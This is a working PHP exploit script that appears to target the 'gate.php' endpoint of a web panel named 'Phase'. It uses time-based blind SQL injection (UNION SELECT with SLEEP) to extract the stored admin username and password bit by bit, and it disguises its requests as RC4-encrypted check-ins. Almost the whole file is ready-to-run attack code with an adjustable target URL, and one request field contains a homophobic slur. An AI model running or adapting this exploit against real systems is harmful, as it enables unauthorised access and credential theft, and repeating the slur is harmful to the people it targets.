	// Panel.zip hash: c49c74a609b24284a0a66fc008c4d8f2
	// Start with PHP CLI (php pwn.php)
	set_time_limit(0);
	
	// Adjust this :)
	define(&#039;SLEEP_TIME&#039;, &#039;4&#039;);
	define(&#039;PAGE_TIME&#039;,  4);
	define(&#039;URL&#039;,        &#039;http://localhost/Phase/&#039;);
	
	echo(&#039;attacking &#039; . URL . PHP_EOL);
	
	get_string(&#039;username&#039;);
	get_string(&#039;password&#039;);
	
	function get_length($field) {
		$length = 1;
		
		while (!is_true("&#039; UNION SELECT ALL 1,2,3,4,5,6,7 FROM `settings` WHERE `key` = &#039;" . $field . "&#039; AND (NOT (LENGTH(value)=" . $length . ") OR SLEEP(" . SLEEP_TIME . "))-- ")) {
			++$length;
		}
		
		echo($field . &#039; length: &#039; . $length . PHP_EOL);
		
		return $length;
	}
	
	function get_string($field) {
		$length = get_length($field);
		$str    = &#039;&#039;;
		
		for ($i = 0; $i < $length; ++$i) {
			$str .= chr(get_char($field, $i));
			echo($field . &#039; : &#039; . str_pad($str, $length, &#039;*&#039;) . PHP_EOL);
		}
		
		return $str;
	}
	
	function get_char($field, $id) {
		$binary = &#039;&#039;;
		
		for ($i = 1; $i < 256; $i *= 2) {
			if ($i == 128)
				$binary = &#039;0&#039; . $binary;
			else
				$binary = (is_true("&#039; UNION SELECT ALL 1,2,3,4,5,6,7 FROM `settings` WHERE `key` = &#039;" . $field . "&#039; AND (NOT (ORD(SUBSTR(`value`," . ($id + 1) . ",1)) & " . $i . ") OR SLEEP(" . SLEEP_TIME . "))-- ") ? &#039;1&#039; : &#039;0&#039;) . $binary;
		}
		
		return bindec($binary);
	}
	
	function is_true($query) {
		$rc4_key   = &#039;aaaa&#039;; // b d u
		$data      = &#039;u=tapz&d=faggot&b=lol&#039;;
		$encode    = rc4($rc4_key, $data, strlen($data), strlen($rc4_key));
		$encode    = $rc4_key . $encode;
		$injection = urlencode($query);
		$req       = post_request(URL . &#039;gate.php?i=127.0.0.1&#039; . $injection, $encode);
		
		return !($req[&#039;time&#039;] < PAGE_TIME);
	}
	
	function post_request($url, $data) {
        $handle = curl_init($url);
        
        curl_setopt($handle, CURLOPT_HEADER,         false);
        curl_setopt($handle, CURLOPT_USERAGENT,      &#039;Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1667.0 Safari/537.36&#039;);
        curl_setopt($handle, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($handle, CURLOPT_POST,           true);
        curl_setopt($handle, CURLOPT_POSTFIELDS,     $data);
		curl_setopt($handle, CURLOPT_TIMEOUT,        30);
        
		$time = microtime(true);
        $page = curl_exec($handle);
        $time = microtime(true) - $time;
		
        curl_close($handle);
		
        return array(
			&#039;page&#039; => $page,
			&#039;time&#039; => $time
		);
    }
	
	function rc4($pwd, $data, $data_length, $pwd_length){
		$key[] = &#039;&#039;;
		$box[] = &#039;&#039;;
		$cipher = &#039;&#039;;

		for ($i = 0; $i < 256; $i++)
		{
			$key[$i] = ord($pwd[$i % $pwd_length]);
			$box[$i] = $i;
		}
		for ($j = $i = 0; $i < 256; $i++)
		{
			$j = ($j + $box[$i] + $key[$i]) % 256;
			$tmp = $box[$i];
			$box[$i] = $box[$j];
			$box[$j] = $tmp;
		}
		for ($a = $j = $i = 0; $i < $data_length; $i++)
		{
			$a = ($a + 1) % 256;
			$j = ($j + $box[$a]) % 256;
			$tmp = $box[$a];
			$box[$a] = $box[$j];
			$box[$j] = $tmp;
			$k = $box[(($box[$a] + $box[$j]) % 256)];
			$cipher .= chr(ord($data[$i]) ^ $k);
		}
		return $cipher;
	}

